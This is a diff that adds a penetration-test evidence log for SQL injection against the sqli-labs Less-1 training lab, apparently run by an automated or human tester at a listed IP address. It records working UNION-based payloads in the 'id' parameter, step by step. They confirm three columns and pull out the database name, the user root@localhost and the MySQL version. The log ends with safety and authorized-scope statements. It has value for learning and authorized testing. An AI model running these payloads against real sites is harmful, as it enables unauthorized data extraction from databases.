@@ -1,0 +1,72 @@
+=== Less-1 SQL Injection UNION Validation Evidence ===
+Timestamp: 2026-05-22T08:44:51Z
+Target: http://154.8.192.137:60000/sqli-labs/Less-1/
+
+=== Test Results ===
+
+1. Baseline (id=1):
+   URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=1
+   Status: 200
+   Length: 721 bytes
+
+2. Single Quote Error (id=1'):
+   URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=1'
+   Status: 200
+   Length: 830 bytes
+   Observation: Response length increased from 721 to 830, indicating SQL error message in response
+
+3. Single Quote with Comment (id=1' -- -):
+   URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=1' -- -
+   Status: 200
+   Length: 721 bytes
+   Observation: Returns to baseline length, confirming SQL comment neutralizes query fragment
+
+4. UNION SELECT 1,2,3 (id=-1' UNION SELECT 1,2,3 -- -):
+   URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=-1' UNION SELECT 1,2,3 -- -
+   Status: 200
+   Length: 715 bytes
+   Observation: UNION query works, column count is 3
+
+5. UNION SELECT with reflection test (id=-1' UNION SELECT 1,'X','Y' -- -):
+   URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=-1' UNION SELECT 1,'X','Y' -- -
+   Status: 200
+   Observation: Columns 2 and 3 are reflected in response
+
+6. UNION SELECT database(),user() (id=-1' UNION SELECT 1,database(),user() -- -):
+   URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=-1' UNION SELECT 1,database(),user() -- -
+   Status: 200
+   Response snippet: Your Login name:security<br>Your Password:root@localhost
+   Observation: Database 'security' and user 'root@localhost' extracted
+
+7. UNION SELECT version(),hostname:
+   MySQL Version: 5.7.26
+   Observation: MySQL version successfully extracted
+
+=== Validation Summary ===
+
+SQL Injection Type: Error-based String Injection (GET parameter 'id')
+Injection Point: GET parameter 'id'
+Backend Database: MySQL 5.7.26
+Database Name: security
+Database User: root@localhost
+UNION Column Count: 3
+Reflected Columns: 2 and 3
+Reflection Points:
+  - Column 2 -> "Your Login name:"
+  - Column 3 -> "Your Password:"
+
+Evidence of Exploitability:
+1. Error differential (721 -> 830 bytes) confirms SQL error triggered
+2. SQL comment (-- -) successfully neutralizes trailing query
+3. UNION SELECT works with 3 columns
+4. Database metadata extractable via UNION
+5. User-controlled input reaches SQL interpreter without sanitization
+
+Safety Statement:
+- All payloads are read-only SELECT queries
+- No data modification or destructive operations
+- Non-destructive authorized scope validation
+
+Scope Statement:
+- Target within authorized scope: http://154.8.192.137:60000/sqli-labs/
+- No out-of-scope access performed
